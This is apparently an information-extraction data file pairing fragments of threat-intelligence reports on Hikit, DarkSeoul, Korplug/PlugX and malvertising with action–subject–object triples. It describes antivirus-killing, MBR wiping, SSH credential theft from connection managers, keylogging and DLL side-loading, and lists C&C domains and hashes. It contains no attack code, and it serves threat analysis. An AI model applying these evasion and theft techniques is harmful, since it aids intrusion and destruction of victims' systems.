(\u201cHikitThreadFunc\u201d) which will service any request coming from the new channel"]}}], " The Gen 2 Driver is a simpler system driver that acts as a rootkit to hide processes, registry\nkeys and network connections associated with Gen 2 activity on the victim\u2019s system": [{"hide": {"A": "hide", "S": "The Gen 2 Driver", "O": ["processes, registry keys and network connections associated with Gen 2 activity on the victim\u2019s system"]}}], " The DLL will\ncreate a new service (e.g": [{"create": {"A": "create", "S": "The DLL", "O": ["a new service"]}}], " While the communication models shifted dramatically between Gen 1 and Gen 2, both\ngenerations of Hikit retain the same basic RAT function consisting of remote command shell, file\nmanagement, network proxy and port forwarding": [{"retain": {"A": "retain", "S": "both generations of Hikit", "O": ["the same basic RAT function consisting of remote command shell, file management, network proxy and port forwarding"]}}], " It does not attempt to obfuscate its functionality from static analysis\nand it hooks a minimum number of kernel API functions in order to hide different pieces of information": [{"hooks": {"A": "hooks", "S": "it", "O": ["in order to hide different pieces of information", "a minimum number of kernel API functions"]}}], "\n\nBoth Gen 1 and Gen 2 sub-families of Hikit consist of a main DLL (referred to as \u201cthe DLL\u201d) that\ncontains the RAT functionality; a kernel driver (referred to as \u201cthe Driver\u201d) with Gen 2 also employs an\nadditional component: a loader executable": [{"contains": {"A": "contains", "S": "a main DLL (referred to as \u201cthe DLL\u201d)", "O": ["the RAT functionality"]}}], " To activate\nthe rootkit, the RAT functionality code creates a service with the driver in the %TEMP%\t\n \u00a0directory as the\nexecutable for the service": [{"creates": {"A": "creates", "S": "the RAT functionality code", "O": ["with the driver in the %TEMP% directory as the executable for the service", "a service"]}}], "\n        StartServer                                                                                                                                                               Activates the Gen 2 RAT (called from a DLL Loader)\n        StopServer                                                                                                                                                                Stops the Gen 2 RAT (called from a DLL Loader)\n</table>\n\nMatrixMain\t\nand\t\nStartServer\t\nboth ultimately generate a new thread (using the POSIX API function\t\n\nbeginthreadex\t\ninstead of the more common\t\nCreateThread) that contains the main loop of the Gen\n2 RAT functionality": [{"generate": {"A": "generate", "S": "MatrixMain and StartServer", "O": ["using the POSIX API function beginthreadex", "a new thread", "instead of the more common CreateThread"]}}], " The Driver intercepts any and all network communication that traverses the Windows\nnetwork stack and potentially removes the data from the network stack under very specific conditions": [{"intercepts": {"A": "intercepts", "S": "The Driver", "O": ["any and all network communication that traverses the Windows network stack"]}}], " This is a surprisingly\ninvasive method to obfuscate a process": [{"obfuscate": {"A": "obfuscate", "O": ["a process"]}}], " This allows an attacker to establish several Gen2 infections within a victim\u2019s\ninfrastructure and if outbound connectivity is prohibited for any of the infected machines, the attacker\ncan route commands to the pseudo-isolated infections through accessible infected machines providing\na high level of persistence to the malware": [{"providing": {"A": "providing", "O": ["to the malware", "a high level of persistence"]}}], " The Gen 1 Driver listens to network traffic arriving at the local\nnetwork interface and waits for a specific trigger string": [{"listens": {"A": "listens", "S": "The Gen 1 Driver", "O": ["to network traffic arriving at the local network interface"]}}], "\n</section>\n<section>\n<heading>Win32 Wiper component</heading>\n\nWhen the AgentBase.exe component is executed, it first attempts to stop the following processes,\npresumably in order to evade detection:\n<list>\n\u2022 pasvc.exe \u2013 policy agent from AhnLab\n\u2022 clisvc.exe \u2013 ViRobot ISMS from Hauri\n</list>\nIt then enumerates": [{"destroying": {"A": "destroying", "S": "It", "O": ["the MBR (master boot record) of the affected drive"]}, "overwrites": {"A": "overwrites", "S": "It", "O": ["with the string: \u201cprincpes\u201d", "the first 512 bytes"]}, "enumerates": {"A": "enumerates", "S": "It", "O": ["all physical drives"]}}], "\nexe and conime.exe to attempt to connect remote servers, upload and run the bash script\n~pr1.tmp": [{"run": {"A": "run", "S": "the dropper"}, "upload": {"A": "upload", "S": "the dropper"}, "connect": {"A": "connect", "S": "the dropper", "O": ["remote servers"]}}], "\n</section>\n<section>\n<heading>Installation</heading>\n\nWhen executed it creates the following files in the affected user\u2019s %Temp% directory:\n<list>\n    \u2022   alg.exe: A legitimate binary used to open SSH connections with remote servers\n        MD5 e45cd9052dd3dd502685dfd9aa2575ca\u2028\n        Size: 166,912 bytes\n    \u2022   conime.exe: A legitimate binary used to open SSH connections with remote servers\n        MD5: 6a702342e8d9911bde134129542a045b\u2028\n        Size: 153,600 bytes\n    \u2022   ~pr1.tmp: Payload - A destructive bash script\n        MD5: dc789dee20087c5e1552804492b042cd\n        Size: 1,186 bytes\u2028\n        Also known as/detected as: \u2028\n                 KillMBR-FBIA (McAfee)\n                 Trojan:SH/Kofornix.A (Microsoft)\n                 Trojan.Jokra (Symantec)\n    \u2022   AgentBase.exe: Payload - Win32 wiper component (see details below)\n        MD5: db4bbdc36a78a8807ad9b15a562515c4\u2028\n        Size: 24,576 \u2028\n</list>\n</section>\n<section>\n<heading>Payload\u2014attempts to connect to remote servers and upload a destructive bash script \u2028</heading>\n\nAfter determining the location of user profile directories on the affected computer, the malware\nsearches these directories for configuration files and directories that may be associated with the\nconnection manager clients mRemote and SecureCRT": [{"searches": {"A": "searches", "S": "the malware", "O": ["for configuration files and directories that may be associated with the connection manager clients mRemote and SecureCRT", "these directories"]}}], "\n": [{"locates": {"A": "locates", "S": "It", "O": ["the root directory on these drives"]}, "delete": {"A": "delete", "S": "It", "O": ["all files and folders in this directory"]}, "look": {"A": "look", "S": "It", "O": ["for removable and fixed drives"]}, "is shut down and rebooted": {"A": "is shut down and rebooted", "S": "It", "O": ["the affected computer"]}}], "\n</section>\n<section>\n<heading>Win32 Wiper component</heading>\n\nWhen the AgentBase.exe component": [{"is executed": {"A": "is executed", "O": ["the AgentBase.exe component"]}}], " The malware attempted to disable AhnLab and Hauri AV antivirus products then\nproceeded to overwrite the master boot record (MBR)": [{"overwrite": {"A": "overwrite", "S": "The malware", "O": ["the master boot record (MBR)"]}, "disable": {"A": "disable", "S": "The malware", "O": ["AhnLab and Hauri AV antivirus products"]}}], " The upload server vector included a time-based logic bomb that allowed the wiper\nto target a large number of systems, on a set time and date, with full permissions on all of the\ntargeted systems.<fn>383</fn>\n\nAccording to CrowdStrike, the wiper malware was dropped on the systems as AgentBase.exe": [{"was dropped": {"A": "was dropped", "O": ["as AgentBase.exe", "on the systems", "the wiper malware"]}}, {"target": {"A": "target", "S": "the wiper", "O": ["a large number of systems", "with full permissions on all of the targeted systems", "on a set time and date"]}}], " The\noperation was codenamed \u201cTroy\u201d due to the frequent use of the word \u201cTroy\u201d in the malware\u2019s\ncompile path strings.<fn>335</fn> The malware used in these attacks sought out and exfiltrated data, based\non keyword searches": [{"exfiltrated": {"A": "exfiltrated", "S": "The malware used in these attacks", "O": ["data"]}, "sought out": {"A": "sought out", "S": "The malware used in these attacks"}}], " This RAT is detected by Symantec as Backdoor.Prioxer": [{"is detected": {"A": "is detected", "S": "Symantec", "O": ["as Backdoor.Prioxer", "This RAT"]}}], " IssueMakersLab found that these actors consistently\nused the same 16-digit password for file compression, the same stage 1 C2 protocol, the same\ncollection keywords and encryption keys, and the same development path.<fn>343</fn> According to South\nKorea\u2019s Korea Internet and Security Agency, the North Korean IP address 175.45.178.xx was\nfound scanning South Korean routes the month before the attacks,<fn>344</fn> and the same IP was\nreportedly logged as accessing one of the targets 13 times.<fn>345</fn> Details of the March 20 attack also\nsuggested possible ties to China": [{"used": {"A": "used", "S": "these actors", "O": ["the same collection keywords and encryption keys"]}}, {"scanning": {"A": "scanning", "S": "the North Korean IP address 175.45.178.xx", "O": ["South Korean routes"]}}], " \u2028\n\nIf an mRemote installation is located, the dropper reads the configuration file and checks if there\u2019s\na NODE that is defined with \u201cUsername=root\u201d, \u201cProtocol=SSH\u201d, and a password that is not blank": [{"reads": {"A": "reads", "S": "the dropper", "O": ["the configuration file"]}}], "\n\nAccording to CrowdStrike, a third malware component downloaded an IRC RAT from various\ncompromised websites": [{"downloaded": {"A": "downloaded", "S": "a third malware component", "O": ["an IRC RAT", "from various compromised websites"]}}], " If\n\fthose conditions are satisfied it extracts the information": [{"extracts": {"A": "extracts", "S": "it", "O": ["the information"]}}], "\n</section>\n<section>\n<heading>Win32 Wiper component</heading>\n\nWhen the AgentBase.exe component is executed, it first attempts to stop the following processes,\npresumably in order to evade detection:\n<list>\n\u2022 pasvc.exe \u2013": [{}], " While the malware was clearly intended to search for and exfiltrate certain\ntypes of data, its true impact on the targets was never revealed": [{"search": {"A": "search", "S": "the malware"}, "exfiltrate": {"A": "exfiltrate", "S": "the malware"}}], " The attack was capable of wiping both\nLinux and Windows machines.<fn>341</fn> McAfee found that these attacks were the culmination of the\nmalware campaign they dubbed \u201cOperation Troy\u201d.<fn>342</fn>\n\nA report from IssueMakersLab tied the actors responsible for the March 20, 2013 attacks to cyber\nattack activity occurring as early as 2007": [{"wiping": {"A": "wiping", "S": "The attack", "O": ["both Linux and Windows machines"]}}], " AlienVault suspected the Chinese exploit kit GonDad was used to\nspread the malware, and the Korean domains serving the malware were registered using a\nChinese email address": [{"spread": {"A": "spread", "S": "the Chinese exploit kit GonDad", "O": ["the malware"]}}], "\n</section>\n<section>\n<heading>Win32 Wiper component</heading>\n\nWhen the AgentBase.exe component is executed,": [{"stop": {"A": "stop", "S": "it", "O": ["the following processes"]}, "evade": {"A": "evade", "S": "it", "O": ["detection"]}}], " \u2028\n\nThe bash script initially checks which UNIX it is running on (of HP-UX, SunOS, Linux, or AIX) and\nthen attempts to wipe the /kernel, /usr /etc and /home directories, thus": [{"checks": {"A": "checks", "S": "The bash script", "O": ["UNIX"]}, "wipe": {"A": "wipe", "S": "The bash script", "O": ["the /kernel, /usr /etc and /home directories"]}, "rendering": {"A": "rendering", "S": "The bash script", "O": ["the machine inoperative"]}}], "\n</section>\n<section>\n<heading>Win32 Wiper component</heading>\n\nWhen the AgentBase.exe component is executed, it first attempts to stop the following processes,\npresumably in order to evade detection:\n<list>\n\u2022 pasvc.exe \u2013 policy agent from AhnLab\n\u2022 clisvc.exe \u2013": [{}], " The\nwiper used the Windows utility 'taskkill' to kill the processes pasvc.exe and clisvc.exe, which are\nthe main processes for the Ahnlab and Hauri antivirus applications.<fn>384</fn> <fn>385</fn> The wiper then\nperformed system reconnaissance, gathering drive information and operating system version": [{"performed": {"A": "performed", "S": "The wiper", "O": ["system reconnaissance"]}, "gathering": {"A": "gathering", "S": "The wiper", "O": ["drive information and operating system version"]}}, {"kill": {"A": "kill", "S": "The wiper", "O": ["the processes pasvc.exe and clisvc.exe"]}}], "\nDepending on the OS used, the wiper recursively deleted files on the file system, deleting the\nWindows folder last": [{"deleted": {"A": "deleted", "S": "the wiper", "O": ["files on the file system"]}, "deleting": {"A": "deleting", "S": "the wiper", "O": ["the Windows folder"]}}], " <fn>327</fn></caption>\n\nIn May 2013, DarkSeoul malware was used to attack several South Korean financial institutions;\nand in June, DarkSeoul DDoS attacks were launched against the South Korean government\u2019s DNS\nserver": [{"were launched": {"A": "were launched", "O": ["against the South Korean government\u2019s DNS server", "DarkSeoul DDoS attacks"]}}], " It then overwrote the MBR with the strings \"HASTATI\", \"PRINCPES\",\n\"PRINCIPES\", or \"PR!NCPES\u201d.<fn>386</fn>\n\nWhile there are several variants of the wiper, all seem to have been used on the same date": [{"overwrote": {"A": "overwrote", "S": "It", "O": ["with the strings \"HASTATI\", \"PRINCPES\", \"PRINCIPES\", or \"PR!NCPES\u201d", "the MBR"]}}], " \u2028\n\nIf a SecureCRT installation is located, the dropper extracts information from sessions that have\nUsername=root, Protocol=SSH and a saved password": [{"extracts": {"A": "extracts", "S": "the dropper", "O": ["from sessions that have Username=root, Protocol=SSH and a saved password", "information"]}}], " The impact of the March 20 attacks included\ndisruption of service at financial institutions and data deletion": [{"included": {"A": "included", "S": "the March 20 attacks", "O": ["disruption of service at financial institutions"]}}], " As Yang had predicted, it wiped the client.<fn>382</fn> While the method for initial compromise of\nthe update server is not noted in detail, CrowdStrike\u2019s report cites \u201ccollateral information\u201d that\nsuggests targeted email attacks were used to gain initial entry, and policy servers were then\ncompromised": [{"were used": {"A": "were used", "O": ["to gain initial entry", "targeted email attacks"]}}, {"were then compromised": {"A": "were then compromised", "O": ["policy servers"]}}], " In April 2012, the regime reportedly listed\n\n<box>According to statements\nfrom the South Korean\ngovernment, North\nKorea\u2019s Lab 110 were the\nactors behind the\nDarkSeoul malware\nattacks.</box>\n\n<footnote>\n330\n    http://edition.cnn.com/2014/07/02/world/asia/south-korea-xi-visit/index.html?hpt=hp_bn7\n331\n    http://mobile.nytimes.com/blogs/sinosphere/2014/07/07/q-and-a-john-delury-on-chinese-south-korean-ties/?smid=tw-share\n332\n    http://www.globalpost.com/dispatch/news/yonhap-news-agency/140825/n-korea-urges-un-action-against-s-korea-us-military-drill\n333\n    http://www.theguardian.com/world/2009/jul/11/south-korea-blames-north-korea-cyber-attacks\n334\n    http://www.csmonitor.com/World/Security-Watch/2013/1019/In-cyberarms-race-North-Korea-emerging-as-a-power-not-a-pushover/(page)/2\n335\n    http://www.darkreading.com/attacks-and-breaches/south-korean-bank-hackers-target-us-military-secrets/d/d-id/1110674?\n336\n    http://motherboard.vice.com/blog/the-dark-seoul-hackers-were-after-south-korean-military-secrets\n337\n    http://blogs.mcafee.com/wp-content/uploads/2011/07/McAfee-Labs-10-Days-of-Rain-July-2011.pdf\n338\n    http://www.symantec.com/connect/blogs/four-years-darkseoul-cyberattacks-against-south-korea-continue-anniversary-korean-war\n339\n    http://www.nytimes.com/2013/03/21/world/asia/south-korea-computer-network-crashes.html?pagewanted=all&_r=1&\n</footnote>\n\fthose entities as attack targets.<fn>340</fn> The malware used in the March 20, 2013 attacks were wiper\nmalware": [{"were": {"A": "were", "S": "The malware used in the March 20, 2013 attacks", "O": ["wiper malware"]}}], "\n</section>\n<section>\n<heading>Win32 Wiper component</heading>\n\nWhen the AgentBase.exe component is executed, it first attempts to stop the following processes,\npresumably in order to evade detection:\n<list>\n\u2022": [{}], "\n</section>\n<section>\n<heading>Win32 Wiper component</heading>\n\nWhen the AgentBase.exe component is executed, it first attempts to stop the following processes,\npresumably in order to evade detection:\n<list>\n\u2022 pasvc.exe \u2013 policy agent from AhnLab\n\u2022": [{}], "\n\fMalware tries to communicate with": [{"exfiltrate": {"A": "exfiltrate", "S": "Malware", "O": ["user information"]}, "communicate": {"A": "communicate", "S": "Malware", "O": ["with the user account created at the WebDAV C&C"]}}], "\n\n<figure></figure> <caption> \f                                   Second Level Shell Code Analysis </caption>\n\nNow we have landed into the second level shellcode, but it is obfuscated to evade static analysis": [{"obfuscated": {"A": "obfuscated", "O": ["to evade static analysis", "it"]}}], "\n\n\n\n\nIt's very time-consuming to understand the functionality of the dll as it decrypts and builds its own\nruntime import table to hinder the analysis": [{"builds": {"A": "builds", "S": "it", "O": ["its own runtime import table", "to hinder the analysis"]}}], "\n\fFinally we can see it\u2019s": [{"connecting": {"A": "connecting", "S": "it", "O": ["to webdav.cloudme.com"]}}], " The module\ntransmits the collected information in the body of the POST request and gets new commands from the\nserver\u2019s response": [{"transmits": {"A": "transmits", "S": "The module", "O": ["in the body of the POST request", "the collected information"]}, "gets": {"A": "gets", "S": "The module", "O": ["from the server\u2019s response", "new commands"]}}], " When there is a file waiting for upload (usually,\nthis is file that contains the results of the previously received and executed command), it is read\nfrom disk and uploaded to the server instead of the system information": [{"read": {"A": "read", "O": ["from disk", "it"]}, "uploaded": {"A": "uploaded", "O": ["it", "to the server"]}}], " It collects most of the available information about the\nsystem, transmits it to the C&C server and executes the commands it receives back": [{"transmits": {"A": "transmits", "S": "It", "O": ["it", "to the C&C server"]}, "collects": {"A": "collects", "S": "It", "O": ["most of the available information about the system"]}, "executes": {"A": "executes", "S": "It", "O": ["the commands it receives back"]}}], "\n\n\n<figure></figure>\n\n                                      <caption>C&C server communication cycle</caption>\n\n\n<noncontent>TLP: Green                                               For any inquire please contact intelreports@kaspersky.com\n\f                                                                                                           5</noncontent>\n\nThe module uses Wininet API functions for issuing HTTP POST requests to the server": [{"issuing": {"A": "issuing", "S": "The module", "O": ["to the server", "HTTP POST requests"]}}], " If failed, tries to write to the file f:\\keyhook.log\n\nEach time the keylogger starts, it appends the following header to the log file:\n\n\n--------------------------------------------------------------------------------\nNew Session: %fully qualified computer name% %timestamp%\n--------------------------------------------------------------------------------\n\n\nIt then creates a hidden console window and registers its only export _LowLevelKeyboardProc@12\nas a hook procedure for low-level keyboard input events (WH_KEYBOARD_LL hook)": [{"registers": {"A": "registers", "S": "It", "O": ["its only export _LowLevelKeyboardProc@12", "as a hook procedure for low-level keyboard input events (WH_KEYBOARD_LL hook)"]}}], "\nThe configuration is an INI file that controls the further behavior of the module": [{"controls": {"A": "controls", "S": "The configuration", "O": ["the further behavior of the module"]}}], " Keylogger module</heading>\n\nFile name: varies\nMD5: a3cbf6179d437909eb532b7319b3dafe\nCompilation timestamp: 2012.10.02 10:51:50 (GMT)\nCompiler: Microsoft Visual Studio 2010\nFile format: PE32 DLL\nExports: _LowLevelKeyboardProc@12\n\n\nCreates the log file: %TEMP%\\~DFD3O8.tmp": [{"Creates": {"A": "Creates", "O": ["the log file: %TEMP%\\~DFD3O8.tmp"]}}], "\n\n\nThe low-level keyboard hook procedure intercepts WM_KEYDOWN, WM_KEYUP and WM_\nSYSKEYDOWN system messages and writes information about each keystroke to the log file": [{"writes": {"A": "writes", "S": "The low-level keyboard hook procedure", "O": ["to the log file", "information about each keystroke"]}}], "\n14.\t      Directory listing of available logical drives and of the directories:\n           \u2022\t Desktop\n          \u2022\t %TEMP%\n          \u2022\t %WINDOWS%\\Temp\n</list>\n\n\nThe retrieved information is compressed using bzip2, encrypted with AES and then encoded using\nBase64 before being transmitted to the C&C server": [{"transmitted": {"A": "transmitted", "O": ["The retrieved information", "to the C&C server"]}, "compressed": {"A": "compressed", "O": ["using bzip2", "The retrieved information"]}, "encrypted": {"A": "encrypted", "O": ["with AES", "The retrieved information"]}}], "\n\nIn addition to collecting files, the malware attempts to gather saved passwords, history of visited URLs,\naccount information and proxy information": [{"gather": {"A": "gather", "S": "the malware", "O": ["account information"]}, "collecting": {"A": "collecting", "S": "the malware", "O": ["files"]}}], " Apart from": [{"monitors": {"A": "monitors", "S": "it", "O": ["attached removable media"]}, "doing": {"A": "doing", "S": "it", "O": ["a recursive sweep of all logical fixed and remote drives"]}}], "\n</section>\n<section>\n<heading>Alternative Malware #1: DarkStRat</heading>\n\nA curious Remote Access Trojan, as research points to a Chinese connection but the commands it listens\nto are in Spanish (translation in English):\n<list>\n      CERRAR (close)\n      DESINSTALAR (uninstall)\n      SERVIDOR (server)\n      INFO\n      MAININFO\n      PING\n      REBOOT\n\f      POWEROFF\n      PROC\n      KILLPROC\n      VERUNIDADES (see units)\n      LISTARARCHIVOS (list files)\n      EXEC\n      DELFILE\n      DELFOLDER\n      RENAME\n      MKDIR\n      CAMBIOID (change ID)\n      GETFILE/SENDFILE/RESUMETRANSFER\n      SHELL\n      SERVICIOSLISTAR (list service)\n      INICIARSERVICIO (start service)\n      DETENERSERVICIO (stop service)\n      BORRARSERVICIO (erase service)\n      INSTALARSERVICIO (install service)\n</list>\nThe malware can manage processes and services on the infected machine, transfer files to and from the\nC&C server, run shell commands, and so on": [{"transfer": {"A": "transfer", "S": "The malware", "O": ["to the C&C server", "files transfer from the C&C server"]}, "manage": {"A": "manage", "S": "The malware", "O": ["processes and services on the infected machine"]}, "run": {"A": "run", "S": "The malware", "O": ["shell commands"]}}], "\n\nA table with a selection of RTF documents and RAR self-extracting archives with a .SCR extension is\nshown below:\n<table>\n                                       English\n            File name                                                        SHA1\n                                     translation\n Situation Report about\n                                                         36119221826D0290BC23371B55A8C0E6A84718DD\n Afghan.doc\n AGREEMENT BETWEENTHE\n NATO AND AFGHANISTAN\n ON THE STATUS OF NATO                                   A6642BC9F3425F0AB93D462002456BE231BB5646\n FORCES IN\n AFGHANISTAN.doc\n news.doc                                                51CDC273B5638E06906BCB700335E288807744B5\n \u041f\u043b\u0430\u043d \u0434\u0435\u044f\u0442\u0435\u043b\u044c\u043d\u043e\u0441\u0442\u0438               Activity plan for\n \u0441\u043e\u0435\u0434\u0438\u043d\u0435\u043d\u0438\u0439 \u0438 \u0432\u043e\u0438\u043d\u0441\u043a\u0438\u0445           military units in the\n                                                         EA6EE9EAB546FB9F93B75DCB650AF22A95486391\n \u0447\u0430\u0441\u0442\u0435\u0439 \u041f\u0440\u0438\u0432\u043e\u043b\u0436\u0441\u043a\u043e\u0433\u043e             Volga region in July\n \u0440\u0435\u0433\u0438\u043e\u043d\u0430 \u043d\u0430 \u0438\u044e\u043b\u044c 2014 \u0433.scr      2014\n                                 Telephone directory\n \u0442\u0435\u043b\u0435\u0444\u043e\u043d\u043d\u044b\u0439\u2003\u0441\u043f\u0440\u0430\u0432\u043e\u0447\u043d\u0438\u043a\u2003          of the Ministry of\n                                                         D297DC7D29E42E8D37C951B0B11629051EEBE9C0\n \u0441\u0442\u0440\u0443\u043a\u0442\u0443\u0440\u044b \u041c\u0418\u0414 \u041a\u0420 .scr           Foreign Affairs of\n                                 the Kyrgyz Republic\n \u041e \u0426\u0435\u043d\u0442\u0440\u0435 \u0441\u043e\u0446\u0438\u0430\u043b\u044c\u043d\u043e\u0439             About the Center for\n \u0430\u0434\u0430\u043f\u0442\u0430\u0446\u0438\u0438                       social adaptation of    8E5E19EBE719EBF7F8BE4290931FFA173E658CB8\n \u0432\u043e\u0435\u043d\u043d\u043e\u0441\u043b\u0443\u0436\u0430\u0449\u0438\u0445.scr              servicemen\n                                 Meeting minutes of\n \u041f\u0440\u043e\u0442\u043e\u043a\u043e\u043b \u0432\u0441\u0442\u0440\u0435\u0447\u0438 \u041d\u0413\u0428\n                                 the General Staff of    1F726E94B90034E7ABD148FE31EBA08774D1506F\n \u041a\u041d\u0420.scr\n                                 the PRC\n \u0438\u0441\u043f\u0440\u0430\u0432\u043b\u0435\u043d\u043d\u044b\u0439 \u0448\u0430\u0431\u043b\u043e\u043d \u043f\u043b\u0430\u043d\u0430       Corrected action\n                                                         A9C627AA09B8CC50A83FF2728A3978492AEB79D8\n \u043c\u0435\u0440\u043e\u043f\u0440\u0438\u044f\u0442\u0438\u0439.scr                 plan template\n Situation Report about\n                                                         A9C627AA09B8CC50A83FF2728A3978492AEB79D8\n Afghan.scr\n                                 Military and political\n \u0412\u043e\u0435\u043d\u043d\u043e-\u043f\u043e\u043b\u0438\u0442\u0438\u0447\u0435\u0441\u043a\u0430\u044f             situation in Islamic\n \u043e\u0431\u0441\u0442\u0430\u043d\u043e\u0432\u043a\u0430 \u0432 \u0418\u0420\u0410                Republic of            E32081C56F39EA14DFD1E449C28219D264D80B2F\n\f \u043d\u043004.10.2014.scr                Afghanistan (IRA)\n                                 on 04.10.2014\n Afghan Air Force.scr                                  E32081C56F39EA14DFD1E449C28219D264D80B2F\n \u043f\u043b\u0430\u043d \u043c\u0435\u0440\u043e\u043f\u0440\u0438\u044f\u0442\u0438\u0439.scr            Action plan           1F726E94B90034E7ABD148FE31EBA08774D1506F\n\n</table>\nSome of the above-mentioned files also contained decoy documents:\n\n<figure></figure>\n\n\nIn all of the cases, three binary files were dropped (apart from decoy documents) that led to the Korplug\ntrojan being loading into memory": [{"being loading": {"A": "being loading", "O": ["into memory", "the Korplug trojan"]}}, {"contained": {"A": "contained", "S": "Some of the above-mentioned files", "O": ["decoy documents"]}}, {"were dropped": {"A": "were dropped", "O": ["three binary files"]}}], " For example, the\nKorplug RAT (a.k.a .PlugX) is a well-known toolkit associated with Chinese APT groups and used in a\nlarge number of targeted attacks since 2012": [{"used": {"A": "used", "O": ["since 2012", "in a large number of targeted attacks", "the Korplug RAT (a.k.a .PlugX)"]}}], "\n\nAmong these, we were able to discover several successful infections where the employed Korplug samples\n\fwere connecting to the same C&C domain": [{"were connecting": {"A": "were connecting", "S": "the employed Korplug samples", "O": ["to the same C&C domain"]}}], "\n</section>\n<section>\n<heading>Alternative Malware #2: File Stealer</heading>\n\nThis malware, written in C, and contains several functions for harvesting files off the victim\u2019s hard drive\naccording to criteria set in the configuration file": [{"harvesting": {"A": "harvesting", "S": "This malware", "O": ["files", "according to criteria set in the configuration file", "off the victim\u2019s hard drive"]}}], "\n\nIn addition to collecting files, the malware attempts to gather saved passwords, history of visited URLs,\naccount information and proxy information from the following applications:\n<list>\n      Microsoft Messenger\n      Microsoft Outlook\n      Microsoft Internet Explorer\n      Mozilla Firefox\n</list>\nThe C&C domains used by this malware are:\n<list>\n\f      newvinta.com\n      worksware.net\n</list>\nSome samples of this file stealer detected in": [{"detected": {"A": "detected", "O": ["in these campaigns", "Some samples of this file stealer"]}}], " It is written in Delphi and connects to\nwww.dicemention.com": [{"connects": {"A": "connects", "S": "It", "O": ["to www.dicemention.com"]}}], "\n<list>\nDOMAIN: www.notebookhk.net\nUpdated Date: 2013-11-12 18:03:45\nCreate Date: 2013-06-18 11:08:17\nRegistrant Name: lee stan\nRegistrant Organization: lee stan\nRegistrant Street: xianggangdiqu\nRegistrant City: xianggangdiqu\nRegistrant State: xianggang\nRegistrant Postal Code: 796373\nRegistrant Country: HK\nRegistrant Phone : +0.04375094543\nRegistrant Fax: +0.04375094543\nRegistrant Email:stanlee@gmail.com\n</list>\nOther Korplug samples were connecting to a different domain name resolving to the same IPs as\nnotebookhk.net:\n<list>\nDOMAIN: www.dicemention.com\nUpdated Date: 2013-11-12 18:05:33\nCreate Date: 2013-09-10 14:35:11\nRegistrant Name: z x\nRegistrant Organization: z x\nRegistrant Street: xianggangdiqu\nRegistrant City: xianggangdiqu\nRegistrant State: xianggang\nRegistrant Postal Code: 123456\nRegistrant Country: HK\nRegistrant Phone : +0.0126324313\nRegistrant Fax: +0.0126324313\nRegistrant Email: 123@123.com\n\nDOMAIN: www.abudlrasul.com\nUpdated Date: 2014-10-16 14:16:27\nCreate Date: 2014-10-16 14:16:27\nRegistrant Name: gang xin\nRegistrant Organization: gang xin\n\fRegistrant Street: Argentina Argentina\nRegistrant City: Argentina\nRegistrant State: Argentina\nRegistrant Postal Code: 647902\nRegistrant Country: AR\nRegistrant Phone : +54.0899567089\nRegistrant Fax: +54.0899567089\nRegistrant Email: woffg89@yahoo.com\n</list>\nTaking these C&Cs as a starting point, we were able to locate a number of victims infected through various\nexploit-laden spear-phishing documents and cunningly-named archives": [{"were connecting": {"A": "were connecting", "S": "Other Korplug samples", "O": ["to a different domain name resolving to the same IPs as notebookhk.net"]}}], "\n\n<figure></figure>\n\n<list>\n      exe \u2013 a legitimate executable with a Kaspersky digital signature that would load a DLL with a\n      specific file name\n\f      dll \u2013 a small DLL loader that would pass execution to the Korplug raw binary code\n      dll.avp \u2013 raw Korplug binary\n</list>\nThe Korplug RAT is known to use this side-loading trick by abusing legitimate digitally signed executables\nand is a way to stay under the radar, since a trusted application with a valid signature among startup items\nis less likely to raise suspicion": [{"stay": {"A": "stay", "S": "The Korplug RAT", "O": ["under the radar"]}, "use": {"A": "use", "S": "The Korplug RAT", "O": ["this side-loading trick"]}}], "\n\nThe maliciously crafted documents are RTF files that successfully exploit the CVE-2012-0158 vulnerability\nin Microsoft Word": [{"exploit": {"A": "exploit", "S": "The maliciously crafted documents", "O": ["the CVE-2012-0158 vulnerability in Microsoft Word"]}}], " One of\nthese \u2018alternative RATs\u2019 was connecting to a domain also used by the Korplug samples": [{"was connecting": {"A": "was connecting", "S": "One of these \u2018alternative RATs\u2019", "O": ["to a domain also used by the Korplug samples"]}}], "<doc>\n<section>\n<heading>Korplug military targeted attacks: Afghanistan & Tajikistan</heading>\n\n<figure></figure>\n\n\nAfter taking a look at recent Korplug (PlugX) detections, we identified two larger scale campaigns\nemploying this well-known Remote Access Trojan": [{"employing": {"A": "employing", "S": "two larger scale campaigns", "O": ["this well-known Remote Access Trojan"]}}], "                                                                                    Release Date: 10.27.2014\n</footer>\n\f                                                                                     \n<header>\nInvincea White Paper       8\n</header>\n\n\nFrom the VirusTotal report in Figure 5, you will see that this malware is a Trojan backdoor that would likely\nbe used to download additional malware or to provide remote persistent access to the attacker": [{"is": {"A": "is", "S": "this malware", "O": ["a Trojan backdoor"]}, "download": {"A": "download", "S": "this malware", "O": ["additional malware"]}, "provide": {"A": "provide", "S": "this malware", "O": ["remote persistent access", "to the attacker"]}}], " As soon as the page loaded,\na malicious ad delivered a backdoor Trojan via a Java-based exploit": [{"delivered": {"A": "delivered", "S": "a malicious ad", "O": ["via a Java-based exploit", "a backdoor Trojan"]}}], "\n\nNow advanced threat actors are able to target an organization directly via micro-targeted malvertising,\nbased solely on their corporate network IP range": [{"target": {"A": "target", "S": "advanced threat actors", "O": ["directly", "based solely on their corporate network IP range", "an organization", "via micro-targeted malvertising"]}}], "\n\n\n<figure></figure>\n</section>\n<section>\n<heading>How to Protect Yourself from Micro-targeted Malvertising</heading>\n\nOperation DeathClick is an active campaign to micro-target companies via malvertising in order to\ncompromise their networks": [{"micro-target": {"A": "micro-target", "S": "Operation DeathClick", "O": ["via malvertising", "companies", "in order to compromise their networks"]}}], " For half the price of a candy bar,\nattackers have the unprecedented ability to deliver malware to you through your web browser simply\nbecause of your IP address space and your industry vertical": [{"deliver": {"A": "deliver", "S": "attackers", "O": ["to you", "through your web browser", "because of your IP address space and your industry vertical", "malware"]}}], " In this instance, the host was almost converted to a click-fraud bot": [{"was almost converted": {"A": "was almost converted", "O": ["the host", "to a click-fraud bot"]}}], " Threat actors create a corporate front, advertise on\ncommonly visited sites, then later switch out the landing pages for their ads to pages that host exploit\nkits, or simply create a temporary redirection from their usual content to the malicious landing page": [{"switch": {"A": "switch", "S": "Threat actors", "O": ["out the landing pages for their ads", "to pages that host exploit kits"]}, "create": {"A": "create", "S": "Threat actors", "O": ["a temporary redirection from their usual content to the malicious landing page"]}}], " Items\nhighlighted in the URL below is userid, and the winning bid price to place malvertising of Cryptowall on\nsports.yahoo.com, which is 60 cents": [{"place": {"A": "place", "O": ["malvertising of Cryptowall", "on sports.yahoo.com"]}}], " By 